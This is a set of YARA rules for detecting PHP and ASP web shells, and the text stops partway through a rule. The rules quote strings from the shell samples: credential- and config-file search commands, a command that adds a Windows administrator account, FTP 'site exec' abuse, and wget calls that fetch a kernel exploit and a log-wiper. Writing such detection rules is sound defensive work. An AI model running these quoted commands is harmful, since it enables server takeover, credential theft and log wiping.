rule _060ad92489947d410d897474079c1477_06521d9b70a37cb6455a9684ef3db13944feca2e_35b0448cd3e328b11521ab053ea0c99694119b82_5fa1008e_228
{
   meta:
      description = "php17 - from files 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 5fa1008e2c1a5dee4ca91638903563e6eff10569.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 8786355027e9ea8b98725019f1d594fd194cd412.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash2 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash3 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash4 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
      hash5 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash6 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash7 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash8 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash9 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "\"find config* files in current dir\" => \"find . -type f -name \\\"config*\\\"\"," fullword ascii
      $s2 = "\"find config* files\" => \"find / -type f -name \\\"config*\\\"\"," fullword ascii
      $s3 = "\"find config.inc.php files\" => \"find / -type f -name config.inc.php\"," fullword ascii
      $s4 = "\"find all service.pwd files\" => \"find / -type f -name service.pwd\"," fullword ascii
      $s5 = "\"locate dump files\" => \"locate dump\"," fullword ascii
      $s6 = "\"find all .htpasswd files\" => \"find / -type f -name .htpasswd\"," fullword ascii
      $s7 = "\"find all .fetchmailrc files\" => \"find / -type f -name .fetchmailrc\"," fullword ascii
      $s8 = "\"find all .bash_history files\" => \"find / -type f -name .bash_history\"," fullword ascii
      $s9 = "\"locate config.dat files\" => \"locate config.dat\"," fullword ascii
      $s10 = "\"find all suid files\" => \"find / -type f -perm -04000 -ls\"," fullword ascii
      $s11 = "\"find all sgid files\" => \"find / -type f -perm -02000 -ls\"," fullword ascii
      $s12 = "\"locate config.default.php files\" => \"locate config.default.php\"," fullword ascii
      $s13 = "\"locate config* files \" => \"locate config\"," fullword ascii
      $s14 = "\"locate config.php files\" => \"locate config.php\"," fullword ascii
      $s15 = "\"locate proftpd.conf files\" => \"locate proftpd.conf\"," fullword ascii
      $s16 = "\"locate config.inc files\" => \"locate config.inc\"," fullword ascii
      $s17 = "\"locate vhosts.conf files\" => \"locate vhosts.conf\"," fullword ascii
      $s18 = "\"locate .htpasswd files\" => \"locate '.htpasswd'\"," fullword ascii
      $s19 = "\"locate conf.php files\" => \"locate conf.php\"," fullword ascii
      $s20 = "\"locate httpd.conf files\" => \"locate httpd.conf\"," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _045117b0e0a11a242b9765e79cbf113f_212d9f24612b3f2630e7bd14fa96161e464a1f97_7c63796088d9db9f52d52dfd07a56349f25e81a0_229
{
   meta:
      description = "php17 - from files 045117b0e0a11a242b9765e79cbf113f.php, 212d9f24612b3f2630e7bd14fa96161e464a1f97.php, 7c63796088d9db9f52d52dfd07a56349f25e81a0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5bb64310e1ebc50d776523ae5541a121fbbb0495ec74c29e2a3d6d7a5ed2d812"
      hash2 = "6cb3b072948d9e91fd2eaed38627a5884e11dfe1c8ba547db5528404ec4788c9"
      hash3 = "412e316949c3c138fd813ddb31f5fa15ded4999672480ad39ff0f9d54a8ffc1f"
   strings:
      $s1 = "$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s2 = "move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);" fullword ascii
      $s3 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) {" fullword ascii
      $s4 = "$serper = gethostbyname($_SERVER['SERVER_ADDR']);" fullword ascii
      $s5 = "ype=\"Submit\" name=\"command\" value=\"cok\"></form>';" fullword ascii
      $s6 = "IP Injector= $injektor\");" fullword ascii
      $s7 = "$cur_user = \"(\" . get_current_user() . \")\";" fullword ascii
      $s8 = "if (isset($_POST['command'])) {" fullword ascii
      $s9 = "$web = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s10 = "if ($u != strlen($cwd) - 1) {" fullword ascii
      $s11 = "type=text size=15 name=\"newname\" class=ta><input type=submit class=\"bt\" value=\"Upload\"></form>';" fullword ascii
      $s12 = "if (!$name = $_POST['newname']) {" fullword ascii
      $s13 = "$safem0de = @ini_get('safe_mode');" fullword ascii
      $s14 = "if (isset($_GET['clone'])) {" fullword ascii
      $s15 = "$name = $_FILES['userfile']['name'];" fullword ascii
      $s16 = "if (!isset($_SESSION['bajak'])) {" fullword ascii
      $s17 = "echo \"Upload Failed\";" fullword ascii
      $s18 = "$source = $_SERVER['SCRIPT_FILENAME'];" fullword ascii
      $s19 = "$_SESSION['bajak'] = 0;" fullword ascii
      $s20 = "$_SESSION['bajak']++;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__230
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 691a4634dc5f78ceee68850138b8b68047b8dca6.php, 8d851537dff4dc80cdc23f57784bbf0bd7b4431c.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 946a66a5f7f8be95ea7693ee5500bb404b9d0add.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash6 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash7 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash8 = "3c175446e4a5ddb7ddec93c3338097f3ef96b6edb9cc10801be12346d787f3c0"
      hash9 = "f27b491508d18cbfb6f3e57aafcabe5826a2f0098b187ad6459f40b5812c36e0"
      hash10 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash11 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash12 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash13 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash14 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash15 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash16 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $s1 = "if($this->query('/*'.chr(0).'*/ SELECT * FROM `'.$table.'`')!=1) return 0;" fullword ascii
      $s2 = "$str = \"host='\".$this->host.\"' port='\".$this->port.\"' user='\".$this->user.\"' password='\".$this->pass.\"' dbname='\".$thi" ascii
      $s3 = "if($this->num_rows){$this->columns = @array_keys($this->rows[0]); return 1;};" fullword ascii
      $s4 = "function dump($table)" fullword ascii
      $s5 = "if($this->query('/*'.chr(0).'*/ SHOW CREATE TABLE `'.$table.'`')!=1) return 0;" fullword ascii
      $s6 = "if(@mysql_select_db($this->base,$this->connection)) return 1;" fullword ascii
      $s7 = "if(@mssql_select_db($this->base,$this->connection)) return 1;" fullword ascii
      $s8 = "if(false===($this->res=@pg_query($this->connection,$query)))" fullword ascii
      $s9 = "if(false===($this->res=@ociparse($this->connection,$query)))" fullword ascii
      $s10 = "foreach($sql->columns as $k=>$v) $sql->columns[$k] = htmlspecialchars($v,ENT_QUOTES);" fullword ascii
      $s11 = "while(false !== ($this->rows[] = @oci_fetch_assoc($this->res))) $this->num_rows++;" fullword ascii
      $s12 = "if($this->query('SELECT * FROM '.$table)!=1) return 0;" fullword ascii
      $s13 = "if(empty($this->port)) { $this->port = '3306'; }" fullword ascii
      $s14 = "if(empty($this->port)) { $this->port = '5432'; }" fullword ascii
      $s15 = "if(empty($this->port)) { $this->port = '1433'; }" fullword ascii
      $s16 = "foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @addslashes($v);}" fullword ascii
      $s17 = "foreach($this->rows[$i] as $k=>$v) {$this->rows[$i][$k] = @mysql_real_escape_string($v);}" fullword ascii
      $s18 = "if($sql->get_result())" fullword ascii
      $s19 = "function get_result()" fullword ascii
      $s20 = "if($this->connection) return 1;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_5358b9611032c704f509673a35565eca7b36d9bb_231
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 5358b9611032c704f509673a35565eca7b36d9bb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "a5688bae5f2fecfea22bc43d20390dedb375d5f8278faa322be60388cb899a0b"
   strings:
      $s1 = "echo '<b>' . htmlspecialchars($_POST['login']) . '</b>:' . htmlspecialchars($line) . '<br>';" fullword ascii
      $s2 = "if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {" fullword ascii
      $s3 = "for ($i = strlen($line[0]) - 1;$i >= 0;--$i) $tmp.= $line[0][$i];" fullword ascii
      $s4 = "everse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value=\"2\"> Dictionary</label" ascii
      $s5 = "if (!empty($GLOBALS['auth_pass'])) $m['Logout'] = 'Logout';" fullword ascii
      $s6 = "$fp = @ftp_connect($ip, $port ? $port : 21);" fullword ascii
      $s7 = "if (is_array($temp)) foreach ($temp as $line) {" fullword ascii
      $s8 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\" . addcslashes" ascii
      $s9 = "echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($tmp);" fullword ascii
      $s10 = "if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {" fullword ascii
      $s11 = "/td></tr>' . '<tr><td></td><td><table style=\"padding-left:15px\"><tr><td><span>Login</span></td>' . '<td><input type=text name=" ascii
      $s12 = "echo '<b>' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . '<br>';" fullword ascii
      $s13 = "} elseif ($_POST['proto'] == 'pgsql') {" fullword ascii
      $s14 = "} elseif ($_POST['proto'] == 'mysql') {" fullword ascii
      $s15 = "} elseif ($_POST['type'] == 2) {" fullword ascii
      $s16 = "if (isset($_POST['proto'])) {" fullword ascii
      $s17 = "if ($_POST['proto'] == 'ftp') {" fullword ascii
      $s18 = "if ($_POST['type'] == 1) {" fullword ascii
      $s19 = "if (@$_POST['reverse']) {" fullword ascii
      $s20 = ". htmlspecialchars($_POST['charset']) . '\">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value=\"127." ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _211_3_232
{
   meta:
      description = "php17 - from files 211.php, 3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "87fedb71493055b0654256023ce24ccbf9653ab5630c4784635411b3d552d60d"
      hash2 = "9f2b391fbf8b4f2bc3007c8fbb63168072ee010e7fb51c724396d26bed2b0e5e"
   strings:
      $s1 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s3\", True, \"\", \"\"" fullword ascii
      $s2 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True, \"\", \"\"" fullword ascii
      $s3 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s1\",True, \"\", \"\"" fullword ascii
      $s4 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCrLf & quit" fullword ascii
      $s5 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\" & ftpport & vbCrLf" fullword ascii
      $s6 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
      $s7 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
      $s8 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s9 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s10 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
      $s11 = "<table width=\"494\" height=\"163\" border=\"1\" cellpadding=\"0\" cellspacing=\"1\" bordercolor=\"#666666\">" fullword ascii
      $s12 = "'DO NOT use it to do evil things!" fullword ascii
      $s13 = "<center><form method=\"post\" name=\"goldsun\">" fullword ascii
      $s14 = "<br><font color=red><%=cmd%></font><br><br>" fullword ascii
      $s15 = "<td width=\"379\"><input name=\"u\" type=\"text\" id=\"u\" value=\"LocalAdministrator\"></td>" fullword ascii
      $s16 = "ftpport = 65500" fullword ascii
      $s17 = "<form method=\"post\" name=\"goldsun\">" fullword ascii
      $s18 = "setTimeout(\"document.all.goldsun.submit();\",4000);" fullword ascii
      $s19 = "newdomain = \"-SETDOMAIN\" & vbCrLf & \"-Domain=goldsun|0.0.0.0|\" & ftpport & \"|-1|1|0\" & vbCrLf & \"-TZOEnable=0\" & vbCrLf " ascii
      $s20 = "newdomain = \"-SETDOMAIN\" & vbCrLf & \"-Domain=goldsun|0.0.0.0|\" & ftpport & \"|-1|1|0\" & vbCrLf & \"-TZOEnable=0\" & vbCrLf " ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 20KB and ( 8 of them )
      ) or ( all of them )
}

rule _00392828ffb7aabd6c66ca775f1356eef850c8b7_0353ae68b12b8f6b74794d3273967b530d0d526f_060ad92489947d410d897474079c1477_06521d9b_233
{
   meta:
      description = "php17 - from files 00392828ffb7aabd6c66ca775f1356eef850c8b7.php, 0353ae68b12b8f6b74794d3273967b530d0d526f.php, 060ad92489947d410d897474079c1477.php, 06521d9b70a37cb6455a9684ef3db13944feca2e.php, 25b2ffa40e50b038212591c4eb09a89fe10cbd43.php, 35b0448cd3e328b11521ab053ea0c99694119b82.php, 500c982241212f06be1ffe5fbe5cbec83b6f2f59.php, 5358b9611032c704f509673a35565eca7b36d9bb.php, 5fa1008e2c1a5dee4ca91638903563e6eff10569.php, 75aa5981c7740da3a645cd272029090750474ae1.php, 7e4723914113dcea43f5c7fe31576b45ab97bd12.php, 8786355027e9ea8b98725019f1d594fd194cd412.php, 98d13eea07f57d3b4a2c5079cc27659dde6ebfad.php, a05811ee776c0536a890dba465e501168851df6c.php, a2baa41f5667eb2a3ad57003105e57ed0000af38.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "19ddef3ac56931999f086573be93b5385319b35081e9d5dbce0b8e3e16f85a64"
      hash2 = "14ee4d6daca29a576a047ec7c30efd8c11af51635f023d13772b68aead0dfda6"
      hash3 = "70d1d6937c7b00d4909ff80dcadc7771349d918f99e3515038d550a3d8ac90f2"
      hash4 = "9ebb24b9f38a0cfb5be43a43933fc36aa47140089a5b07560130a88e0c887fed"
      hash5 = "33b0ffc5c6dcf69ccabd978d0c8995f2f4d35d94c5dbbf350f7ded03e6ed82a0"
      hash6 = "b87a5779c3b9ff9e4830be35799a297d9f7dce01d62b6953126f80e969e2a40e"
      hash7 = "51ec7ac29a9aa90eb76d4c3f7cb1983e3eb070e810c020a128d3fa0ef6bde838"
      hash8 = "a5688bae5f2fecfea22bc43d20390dedb375d5f8278faa322be60388cb899a0b"
      hash9 = "0a0944635d48b8d4a44068847e8958710c644233a5227bc193bbd34999dc2131"
      hash10 = "007005ffbf899f70fe325993556129086702958b592d4bf22d8465d202a1b11f"
      hash11 = "d37e7daffca28c0d039f1c41e0d960cb912975fa51e391d12eb7330e983cb5de"
      hash12 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash13 = "9ca48c9df4cd95c76600fc0ae6b525c7adc9edfb606ca5fe24aab23d952de256"
      hash14 = "bdae76eb77568d3cfe7e58878ce5520d2e3065d4567b7c9d24d193a012637227"
      hash15 = "7c07c724d568753b57ae312c6a01c30b0eb9b7117165ef6519d0c125fe751f08"
   strings:
      $s1 = "req.onreadystatechange = processReqChange;" fullword ascii
      $s2 = "var arr=reg.exec(req.responseText);" fullword ascii
      $s3 = "function processReqChange() {" fullword ascii
      $s4 = "document.cf.cmd.value = cmds[cur];" fullword ascii
      $s5 = "<form method=post name=mf style='display:none;'>" fullword ascii
      $s6 = "cmds.pop();" fullword ascii
      $s7 = "cmds.push(cmd);" fullword ascii
      $s8 = "var n = (window.Event) ? e.which : e.keyCode;" fullword ascii
      $s9 = "function add(cmd) {" fullword ascii
      $s10 = "<input type=hidden name=p1 value='uploadFile'>" fullword ascii
      $s11 = "if( (req.readyState == 4) )" fullword ascii
      $s12 = "req = new XMLHttpRequest();" fullword ascii
      $s13 = "if(cur < cmds.length)" fullword ascii
      $s14 = "cur = cmds.length-1;" fullword ascii
      $s15 = "<input type=hidden name=a value='FilesMan'>" fullword ascii
      $s16 = "if(window.Event) window.captureEvents(Event.KEYDOWN);" fullword ascii
      $s17 = "req.send(params);" fullword ascii
      $s18 = "function a(a,c,p1,p2,p3,charset) {" fullword ascii
      $s19 = "function g(a,c,p1,p2,p3,charset) {" fullword ascii
      $s20 = "<table width='100%' class='main' cellspacing='0' cellpadding='2'>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _031d3c46f8a4462cf23accc3aaecf840f77d9a30_144b414a2168fecf31591bbe049e1424ccff4899_1477fa53e5e56605fe001c88831fcb71e30d6e86__234
{
   meta:
      description = "php17 - from files 031d3c46f8a4462cf23accc3aaecf840f77d9a30.php, 144b414a2168fecf31591bbe049e1424ccff4899.php, 1477fa53e5e56605fe001c88831fcb71e30d6e86.php, 1dc03138e5406f8e1f850181e92084ed0f4b5302.php, 35940353c0f3d6511e2789fc3cb9e5b3cea3b10d.php, 5bcb3adc55b62f4e43f154b29d31cced0cbd32a5.php, 649515a5730e7baa0303b29ce49f7e142b88c2ce.php, 91241fc05105627c2f58942867db10b2b691574e.php, 918af72b83a165b25283dbd8f1490309dfdb77da.php, 942e0fc9984256f2bdb17f8d0c77a7afacb7b112.php, 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php, a79be3a055b701ad9977b5176d0478aa0b0dffd4.php, abdbeae0be991e8bab37946a1b55df5af144a0a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "27820c5a30e7d0c36e9e61b5f970de8121e1c493cf22ccdaa3b41f84016f8c5d"
      hash2 = "1fe4c60ea3f32819a98b1725581ac912d0f90d497e63ad81ccf258aeec59fee3"
      hash3 = "124a69cac6fa533abd737127a65ad261a4da66148bf1bdc341e3f733966b5ad6"
      hash4 = "bbbdf28407a4c943f048dcdd7da7515e42797a64b76fd2455e5403b436ec4de8"
      hash5 = "9ecdb14b41785c779d9721e11bf9e1b7e35611015f4aabf9a1f54a82eaa0725c"
      hash6 = "e46777e5f1ac1652db3ce72dd0a2475ea515b37a737fffd743126772525a47e6"
      hash7 = "756b788401aad4bfd4dbafd15c382d98e3ba079390addb5b0cea7ff7f985f881"
      hash8 = "2e5511e45b7c9c6ca7e263ee8d8271214b2b6aae20f2796f4db7b53639f7a699"
      hash9 = "589ad371c414fae2d6f1f0ef7d197cf495bf06d1a0e367f9c3907b77f3054299"
      hash10 = "59105e4623433d5bf93b9e17d72a43a40a4d8ac99e4a703f1d8851ad1276cd88"
      hash11 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
      hash12 = "b7c6ce332434850db4448f8d2bf26157a6aa4ae1afb43bd5829ee6167b561c85"
      hash13 = "1a2bed0ae0b8846eb567043a998ad835d7e4103abcd6618e4ccb01a2a73a9ec9"
   strings:
      $x1 = "if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { err(4); }" fullword ascii
      $s2 = "if (!empty($_POST['alias']) && isset($aliases[$_POST['alias']])) { $_POST['cmd'] = $aliases[$_POST['alias']]; }" fullword ascii
      $s3 = "'eng_err4'=>'Error! Can\\'t login on ftp server'," fullword ascii
      $s4 = "if(!$connection) { err(3); $_POST['cmd'] = \"\"; }" fullword ascii
      $s5 = "st8_file1']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test8'));" fullword ascii
      $s6 = "if(empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none',1).' '.$arh);" fullword ascii
      $s8 = "echo sr(15,\"<b>\".$lang[$language.'_text91'].$arrow.\"</b>\",in('radio','compress',0,'none',1).' '.$arh);" fullword ascii
      $s9 = "echo $fs.$table_up1.div_title($lang[$language.'_text42'],'id3').$table_up2.div('id3').$ts;" fullword ascii
      $s10 = "echo $fs.$table_up1.div_title($lang[$language.'_text57'],'id4').$table_up2.div('id4').$ts;" fullword ascii
      $s11 = "echo $fs.$table_up1.div_title($lang[$language.'_text34'],'id11').$table_up2.div('id11').$ts;" fullword ascii
      $s12 = "echo $fs.$table_up1.div_title($lang[$language.'_text28'],'id2').$table_up2.div('id2').$ts;" fullword ascii
      $s13 = "echo $fs.$table_up1.div_title($lang[$language.'_text2'],'id1').$table_up2.div('id1').$ts;" fullword ascii
      $s14 = "if($_POST['cmd']==\"ftp_file_down\") { if(chop($_POST['loc_file'])==$dir) { $_POST['loc_file']=$dir.((!$unix)?('\\\\'):('/')).ba" ascii
      $s15 = "if(!$unix) { echo @htmlspecialchars(@convert_cyr_string($cmd_rep,'d','w')).\"\\n\"; }" fullword ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text116'].$arrow.\"</b>\",in('text','test8_file1',96,(!empty($_POST['test8_file1'])?($_POST" ascii
      $s17 = "return '<a style=\"cursor: pointer;\" onClick=\"change_divst(\\''.$id.'\\');\">'.$title.'</a>';" fullword ascii
      $s18 = "'eng_err3'=>'Error! Can\\'t connect to ftp'," fullword ascii
      $s19 = "'eng_err5'=>'Error! Can\\'t change dir on ftp'," fullword ascii
      $s20 = "'eng_err1'=>'Error! Can\\'t read file '," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 600KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _061412e4a03c02f9902576ec55ebbe77_7c102999b65267242a29b2b296f2ce992bd23e59_235
{
   meta:
      description = "php17 - from files 061412e4a03c02f9902576ec55ebbe77.php, 7c102999b65267242a29b2b296f2ce992bd23e59.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "181954bb9bd9f7484ba89cc707c62c9287afacf3312b7932018a44ab4b0cab64"
      hash2 = "41b3f472978109cfb97abbcde05c81bf9085c356e7f890f805e1efd078bdf093"
   strings:
      $x1 = "print \"Ajax Command Shell by <a href=http://www.ironwarez.info>Ironfist</a>.<br>Version $version\";" fullword ascii
      $x2 = "<title>Command Shell ~ <?php print getenv(\"HTTP_HOST\"); ?></title>" fullword ascii
      $x3 = "<a href=\"http://www.milw0rm.com\" target=_blank>milw0rm</a>" fullword ascii
      $x4 = "If one of the command execution functions work, the shell will function fine. " fullword ascii
      $s5 = "<b><font size=3>Ajax/PHP Command Shell</b></font><br>by Ironfist" fullword ascii
      $s6 = "print '<b><font size=7>Ajax/PHP Command Shell</b></font>" fullword ascii
      $s7 = "<a href=\"http://www.ironwarez.info\" target=_blank>SharePlaza</a>" fullword ascii
      $s8 = "The shell can be used by anyone to command any server, the main purpose was" fullword ascii
      $s9 = "If you want to add your own custom command in the Quick Commands list, check " fullword ascii
      $s10 = "I know this readme isn\\'t providing too much information, but hell, does this shell" fullword ascii
      $s11 = "to create a shell that feels as dynamic as possible, is expandable and easy" fullword ascii
      $s12 = "//Change this to your password ;)" fullword ascii
      $s13 = "<form action=\".basename(__FILE__).\" method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password n" ascii
      $s14 = "<form action=\".basename(__FILE__).\" method=POST>You are not logged in, please login.<br><b>Password:</b><input type=password n" ascii
      $s15 = "out the code. The $function array contains \\'func name\\' => \\'javascript function\\'." fullword ascii
      $s16 = "<center><b>Quick Commands</b><br>" fullword ascii
      $s17 = "not used to these commands, google a little. " fullword ascii
      $s18 = "and special greetings to everyone in rootshell" fullword ascii
      $s19 = "Try the \"canirun\" command to check this." fullword ascii
      $s20 = "e=p4ssw0rD><input type=submit value=\\\"Log in\\\">" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 60KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _01f78be6f7cad02658508fe4616098a9_05311655a15b75fab86956663e1819cd_0ad17701cf5e5a59aa57f35aa240d9e40d28ba50_0b544ac96e173af1_236
{
   meta:
      description = "php17 - from files 01f78be6f7cad02658508fe4616098a9.php, 05311655a15b75fab86956663e1819cd.php, 0ad17701cf5e5a59aa57f35aa240d9e40d28ba50.php, 0b544ac96e173af11ffee87dee8aad446339801e.php, 1898eebe767f4dda4709621164eeef8377c43bb3.php, 32e36b9cd77416c8e4d5d7284d54683e75abfed6.php, 626c5c9305cee457e10b85c81af262c5bc437255.php, 6612561e19ec45c494d5154c3b502a2e72817735.php, 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php, 8cb6a80a86bf37cd3977cab94909c299ec22a092.php, ad1928ed1cec75b09a7d05548b47cae5c472a427.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ae6e0b74f1a1697985e45ec9fbd291fbc9ace52680fc2fd14726abf66859138a"
      hash2 = "0202f72b3e8b62e5ebc99164c7d4eb8ec5be6a7527286e9059184aa8321e0092"
      hash3 = "59f77ca5eb2380fcee10e7282bdcbb628a075bd83ff3dfabd2b8851cc80a466b"
      hash4 = "12e93dd17c20d1aef103ccc66e1b7d5b3849b81a0ab88e8c03777a7a88fbebf0"
      hash5 = "ef3a7cd233a880fc61efc3884f127dd8944808babd1203be2400144119b6057f"
      hash6 = "5ac936e86e90cda1df398a4f3044c9d6d1707bc6ddf5d1bbdfc9e03553ff907b"
      hash7 = "bbe0f7278041cb3a6338844aa12c3df6b700a12a78b0a58bce3dce14f1c37b96"
      hash8 = "bf83456b0b6f02b4bc25f1848c7f825cd7505f2c740f01c1a254df33bfebfa06"
      hash9 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
      hash10 = "f5e8951fddabbfebee6f93380486d027fd88f05623f3856dcf81ae05e78d9da6"
      hash11 = "63d02e75b729e2cc17604235cf9c0b506b3ca5d578a8e32a0e85e28763ca25a6"
   strings:
      $x1 = "<OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget insta" fullword ascii
      $x2 = "<OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If " fullword ascii
